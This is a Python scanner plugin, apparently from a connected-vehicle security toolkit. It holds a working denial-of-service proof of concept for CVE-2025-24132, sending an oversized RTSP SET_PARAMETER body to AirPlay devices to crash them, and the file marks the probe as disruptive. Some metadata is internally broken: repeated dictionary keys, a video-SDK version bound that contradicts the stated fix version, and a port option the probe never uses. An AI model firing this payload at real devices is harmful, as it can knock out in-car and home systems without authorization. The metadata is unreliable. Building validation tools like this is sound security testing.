#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

import socket

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin


def _airborne_memory_probe(host: str, port: int) -> dict:
    """Test CVE-2025-24132: oversized SET_PARAMETER body triggering memory mishandling."""
    body = ("volume: " + "9" * 3064).encode()
    request = (
        f"SET_PARAMETER rtsp://{host}/stream RTSP/1.0\r\n"
        f"CSeq: 9\r\n"
        f"Content-Type: text/parameters\r\n"
        f"Content-Length: {len(body)}\r\n\r\n"
    ).encode() + body
    result = {"connected": False, "status": "", "error": ""}
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5.0)
        sock.connect((host, port))
        result["connected"] = True
        sock.sendall(request)
        resp = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            resp += chunk
            if b"\r\n\r\n" in resp:
                break
        sock.close()
        if resp:
            result["status"] = resp.split(b"\r\n")[0].decode(errors="replace")
        result["response_len"] = len(resp)
    except ConnectionRefusedError:
        result["error"] = "connection_refused"
    except socket.timeout:
        result["error"] = "timeout"
    except OSError as exc:
        result["error"] = str(exc)
    return result


def _run_poc(plugin) -> dict:
    params = plugin.params or {}
    target_ip = params.get("target_ip", getattr(plugin, "target_ip", "127.0.0.1"))
    airplay_port = int(params.get("airplay_port", 7000))

    evidence = {
        "cve": "CVE-2025-24132",
        "target": target_ip,
        "technique": "AirBorne: oversized SET_PARAMETER body to trigger memory mishandling (DoS/crash)",
        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2025-24132",
        "affected_sdk": "AirPlay audio SDK < 2.7.1 / AirPlay video SDK < 3.6.0.126",
    }

    result = _airborne_memory_probe(target_ip, airplay_port)
    evidence["rtsp_probe"] = result

    if not result["connected"]:
        vulnerable = None
        evidence["note"] = "AirPlay port not reachable; cannot probe for CVE-2025-24132"
    elif "200" in result["status"] or "451" in result["status"]:
        vulnerable = True
        evidence["note"] = "Target processed oversized SET_PARAMETER body without rejection - potential memory mishandling"
    elif "400" in result["status"]:
        vulnerable = False
        evidence["note"] = "Server rejected malformed SET_PARAMETER (400 Bad Request) - may be patched"
    else:
        vulnerable = None
        evidence["note"] = f"Response: {result['status']} - requires manual analysis"

    return {
        "vulnerable": vulnerable,
        "evidence": evidence,
        "requires_manual_review": vulnerable is None,
    }


VULN = {
    'cve': 'CVE-2025-24132',
    'year': 2025,
    'domain': 'application',
    'vendor_product': 'Unknown',
    'component': 'Unknown',
    'type': 'Unknown',
    'summary': 'CVE-2025-24132 AirBorne系列漏洞 Active Validation',
    'source_url': 'https://nvd.nist.gov/vuln/detail/CVE-2025-24132',
    'affected': [{'vendor': 'Unknown', 'product': 'Unknown', 'versions': []}],
    'id': 0,
    "id": 85,
    "cve": "CVE-2025-24132",
    "year": 2025,
    "domain": "车载互联/CarPlay相关",
    "vendor_product": "Apple AirPlay/CarPlay ecosystem",
    "component": "AirPlay SDK",
    "type": "AirBorne系列漏洞",
    "summary": "AirPlay协议/SDK漏洞，影响部分第三方设备与车载集成生态。",
    "source_description": "The issue was addressed with improved memory handling. This issue is fixed in AirPlay audio SDK 2.7.1 and AirPlay video SDK 3.6.0.126. An attacker on the local network may cause an unexpected app termination.",
    "poc_status": "有Oligo公开研究；PoC有限",
    "research_value": "作为智能网联汽车常见基础组件/无线协议/车载互联依赖的关联漏洞纳入。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2025-24132",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2025-24132",
        "https://support.apple.com/en-us/122403",
        "https://cveawg.mitre.org/api/cve/CVE-2025-24132"
    ],
    "affected": [
        {
            "vendor": "Apple",
            "product": "AirPlay audio SDK",
            "versions": [
                {
                    "version": "0",
                    "status": "affected",
                    "lessThan": "2.7.1",
                    "versionType": "custom"
                }
            ]
        },
        {
            "vendor": "Apple",
            "product": "AirPlay video SDK",
            "versions": [
                {
                    "version": "0",
                    "status": "affected",
                    "lessThan": "2.7.1",
                    "versionType": "custom"
                }
            ]
        }
    ],
    "signature_tokens": [
        "CVE-2025-24132",
        "Apple",
        "AirPlay",
        "CarPlay",
        "ecosystem",
        "SDK",
        "AirBorne",
        "issue",
        "addressed",
        "improved",
        "memory",
        "handling",
        "fixed",
        "audio",
        "video",
        "local",
        "network",
        "cause",
        "unexpected",
        "termination",
        "AirPlay audio SDK",
        "AirPlay video SDK"
    ],
    "active_probe_paths": ["/server-info"],
    "active_payload_text": "SET_PARAMETER rtsp://127.0.0.1/stream RTSP/1.0\r\nCSeq: 9\r\nContent-Type: text/parameters\r\nContent-Length: 3072\r\n\r\n" + "volume: " + "9" * 3064,
}


try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class Poc61CVE202524132AirBorneAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = 'XLSX-085'
    meta_poc_name = 'CVE-2025-24132 AirBorne系列漏洞 Active Validation'
    meta_cve_id = 'CVE-2025-24132'
    meta_severity = 'High'
    meta_protocol = 'airplay'
    meta_target_os = ['all']
    meta_required_params = ['software_inventory_text']
    meta_profiles = ['application']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2025-24132'
    meta_references       = ['https://nvd.nist.gov/vuln/detail/CVE-2025-24132']
    meta_attack_surface = '车机APP/应用'
    is_disruptive = True
    meta_destructive_level = "Disruptive"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "61_AirPlay_SDK_AirBorne_Exposure_Audit") if "VULN" in dir() else "61_AirPlay_SDK_AirBorne_Exposure_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc61CVE202524132AirBorneAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
